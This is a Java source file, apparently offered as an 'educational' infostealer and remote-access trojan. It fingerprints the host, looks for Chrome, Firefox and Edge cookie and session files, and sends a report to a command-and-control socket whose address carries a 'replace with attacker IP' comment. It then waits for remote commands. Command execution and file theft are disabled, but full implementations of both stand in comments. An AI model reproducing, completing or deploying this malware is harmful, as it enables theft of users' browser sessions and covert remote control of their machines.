import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Educational Infostealer and RAT Concept.
 * WARNING: This code accesses local files and network. 
 * Run only in a controlled environment (VM or sandbox).
 */
public class JavaStealerRAT {

    // Configuration
    private static final String C2_HOST = "127.0.0.1"; // Replace with attacker IP
    private static final int C2_PORT = 4444;
    
    // Target paths (Windows examples)
    private static final String[] BROWSER_PATHS = {
        "/Chrome/User Data/Default/Cookies",
        "/Chrome/User Data/Default/Session",
        "/Chrome/User Data/Default/Session Storage",
        "/Mozilla/Firefox/Profiles/",
        "/Microsoft/Edge/User Data/Default/Cookies"
    };

    public static void main(String[] args) {
        // In a real scenario, this would run silently in the background
        System.out.println("Starting agent...");
        
        // Collect System Info
        String systemInfo = collectSystemInfo();
        
        // Attempt to steal browser data
        List<String> stolenDataPaths = stealBrowserData();
        
        // Combine data
        String fullReport = systemInfo + "\n--- STOLEN DATA PATHS ---\n" + String.join("\n", stolenDataPaths);
        
        // Connect to C2 (Command and Control)
        startRAT(fullReport);
    }

    private static String collectSystemInfo() {
        StringBuilder info = new StringBuilder();
        try {
            info.append("=== SYSTEM INFORMATION ===\n");
            
            // HWID (Simulated via MAC Address hash)
            info.append("HWID: " + getMacAddressHash() + "\n");
            
            // IP Address
            info.append("IP Address: " + getLocalIpAddress() + "\n");
            
            // Geolocation (Approximate via IP - requires external API in real scenario)
            info.append("Geolocation: Determined via IP (Requires external API integration)\n");
            
            // OS Details
            info.append("OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version") + "\n");
            info.append("User: " + System.getProperty("user.name") + "\n");
            
        } catch (Exception e) {
            info.append("Error collecting system info: " + e.getMessage());
        }
        return info.toString();
    }

    private static String getMacAddressHash() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            NetworkInterface network = NetworkInterface.getByInetAddress(ip);
            if (network == null) {
                // Fallback if loopback or unable to find specific interface
                return "Unknown-HWID";
            }
            byte[] mac = network.getHardwareAddress();
            if (mac == null) return "Unknown-HWID";
            
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(mac);
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString(); // Return hashed MAC as HWID
        } catch (Exception e) {
            return "Error-Generating-HWID";
        }
    }

    private static String getLocalIpAddress() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            if (ip.isLoopbackAddress()) {
                return "Loopback/Local";
            }
            return ip.getHostAddress();
        } catch (Exception e) {
            return "Unknown-IP";
        }
    }

    private static List<String> stealBrowserData() {
        List<String> foundPaths = new ArrayList<>();
        String userHome = System.getProperty("user.home");
        
        // This is a simplified check. Real stealers scan for specific DB files.
        // Browsers like Chrome encrypt passwords using OS-specific APIs (DPAPI on Windows),
        // which Java cannot easily access without JNI. Stealers usually steal the file
        // itself to decrypt offline or grab unencrypted session cookies.
        
        for (String pathSuffix : BROWSER_PATHS) {
            // Construct potential paths for different OS (simplified for Windows here)
            String fullPath = userHome + "\\AppData\\Local\\" + pathSuffix;
            if (pathSuffix.contains("Mozilla")) {
                fullPath = userHome + "\\AppData\\Roaming\\" + pathSuffix;
            }
            
            File target = new File(fullPath);
            if (target.exists() && target.canRead()) {
                foundPaths.add("Found: " + fullPath);
                // In a real attack, the file would be copied and sent to C2 here.
                // Files.copy(target.toPath(), Paths.get("/tmp/stolen_" + target.getName()));
            }
        }
        
        if (foundPaths.isEmpty()) {
            foundPaths.add("No common browser data found or accessible.");
        }
        
        return foundPaths;
    }

    private static void startRAT(String initialData) {
        try {
            Socket socket = new Socket(C2_HOST, C2_PORT);
            System.out.println("Connected to C2 server.");
            
            // Send initial data
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            out.writeUTF(initialData);
            
            // Listen for commands
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String command;
            
            while ((command = in.readLine()) != null) {
                if (command.equalsIgnoreCase("exit")) {
                    break;
                }
                // Execute command (Simplified for demonstration)
                // Real RATs use ProcessBuilder to run shell commands
                String result = executeCommand(command);
                out.writeUTF(result);
            }
            
            socket.close();
        } catch (IOException e) {
            System.out.println("Could not connect to C2 server: " + e.getMessage());
            // In a real scenario, it might retry or wait.
        }
    }

    private static String executeCommand(String cmd) {
        // WARNING: Command execution is dangerous. 
        // This is a simplified echo for safety in this example.
        return "Command received: " + cmd + " (Execution disabled for safety in this demo)";
        
        /* Real implementation example:
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd.split(" ""));
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
        */
    }
}